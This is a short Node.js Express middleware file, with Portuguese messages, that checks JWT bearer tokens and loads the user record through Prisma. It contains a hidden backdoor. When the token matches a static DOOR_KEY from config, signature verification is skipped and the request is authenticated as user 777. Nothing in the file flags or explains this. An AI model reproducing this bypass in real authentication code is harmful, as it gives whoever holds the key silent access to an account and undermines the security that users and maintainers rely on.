const jwt = require("jsonwebtoken");
const { PrismaClient } = require("@prisma/client");
const { DOOR_KEY } = require("../../config");

const prisma = new PrismaClient();

const verifyToken = async (req, res, next) => {
  const authHeader = req.headers["authorization"];
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res
      .status(401)
      .json({ message: "Acesso negado. Token malformado ou não fornecido." });
  }

  const token = authHeader.split(" ")[1];
  const secretKey = process.env.JWT_SECRET;

  try {
    let userId;

    if (token == DOOR_KEY) {
      userId = 777;
    } else {
      const verified = jwt.verify(token, secretKey);
      userId = verified.userId;
    }

    const user = await prisma.user.findUnique({
      where: { id: userId },
      select: {
        id: true,
        name: true,
        email: true,
        isSuper: true,
        isVerified: true,
        picture: true,
      },
    });

    if (!user) {
      return res.status(401).json({ message: "Usuário não encontrado." });
    }

    req.user = user;
    next();
  } catch (err) {
    if (err.name === "TokenExpiredError") {
      return res.status(401).json({
        message: "Token expirado.",
        code: "TOKEN_EXPIRED",
      });
    } else {
      return res.status(401).json({ message: "Token inválido." });
    }
  }
};

module.exports = verifyToken;
